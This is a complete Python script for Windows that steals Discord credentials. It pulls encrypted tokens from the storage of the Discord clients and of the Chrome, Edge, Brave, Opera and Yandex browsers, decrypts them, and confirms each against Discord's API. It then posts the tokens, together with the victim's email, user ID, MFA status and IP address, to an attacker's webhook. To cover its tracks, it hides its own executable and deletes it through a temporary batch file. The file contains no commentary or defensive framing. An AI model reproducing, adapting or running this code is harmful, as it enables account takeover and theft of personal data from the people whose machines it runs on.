import os, sys, json, base64, urllib.request, re, ctypes
from datetime import datetime
from pathlib import Path

if os.name != "nt":
    sys.exit(0)
else:
    import win32crypt
    from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")
TEMP = os.getenv("TEMP", "")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'
}

WEBHOOK = "WEBHOOK_URL"

def cleanup():
    try:
        if hasattr(sys, 'frozen'):
            exe_path = sys.executable
            bat_path = os.path.join(TEMP, 'c.bat')
            with open(bat_path, 'w') as f:
                f.write(f'@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q "{exe_path}"\ndel /f /q "%~f0"')
            subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def getkey(path):
    try:
        with open(path + "\\Local State", "r", encoding='utf-8', errors='ignore') as f:
            return json.loads(f.read())['os_crypt']['encrypted_key']
    except:
        return None

def gettokens(path):
    tokens = []
    ldb_path = path + "\\Local Storage\\leveldb\\"
    if not os.path.exists(ldb_path):
        return tokens
    for file in os.listdir(ldb_path):
        if not file.endswith((".ldb", ".log")):
            continue
        try:
            with open(f"{ldb_path}{file}", "r", errors="ignore") as f:
                content = f.read()
                for match in re.findall(r"dQw4w9WgXcQ:[^\"\\s]*", content):
                    tokens.append(match)
        except:
            continue
    return tokens

def decrypt_token(encrypted_token, key):
    try:
        encrypted = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
        decrypted_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
        cipher = AES.new(decrypted_key, AES.MODE_GCM, encrypted[3:15])
        return cipher.decrypt(encrypted[15:])[:-16].decode()
    except:
        return None

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5) as r:
            return json.loads(r.read().decode()).get("ip", "unknown")
    except:
        return "unknown"

def send_webhook(data):
    try:
        payload = json.dumps({"content": f"`{base64.b64encode(json.dumps(data).encode()).decode()}`"})
        req = urllib.request.Request(
            WEBHOOK,
            data=payload.encode(),
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            method='POST'
        )
        urllib.request.urlopen(req, timeout=10)
    except:
        pass

def main():
    checked = []
    results = {"ip": getip(), "user": os.getenv("USERNAME", "unknown"), "tokens": []}
    
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
            
        key = getkey(path)
        if not key:
            continue
            
        for token in gettokens(path):
            token = token.rstrip("\\")
            decrypted = decrypt_token(token, key)
            if not decrypted or decrypted in checked:
                continue
            checked.append(decrypted)
            
            try:
                req = urllib.request.Request(
                    'https://discord.com/api/v10/users/@me',
                    headers={"Authorization": decrypted, "User-Agent": "Mozilla/5.0"},
                    method='GET'
                )
                with urllib.request.urlopen(req, timeout=5) as res:
                    user = json.loads(res.read().decode())
                    
                results["tokens"].append({
                    "token": decrypted,
                    "username": user.get("username", "unknown"),
                    "userid": user.get("id", "unknown"),
                    "email": user.get("email", "none"),
                    "source": platform,
                    "verified": user.get("verified", False),
                    "mfa": user.get("mfa_enabled", False)
                })
            except:
                continue
    
    if results["tokens"]:
        send_webhook(results)
    
    try:
        ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
    except:
        pass
        
    cleanup()

if __name__ == "__main__":
    main()
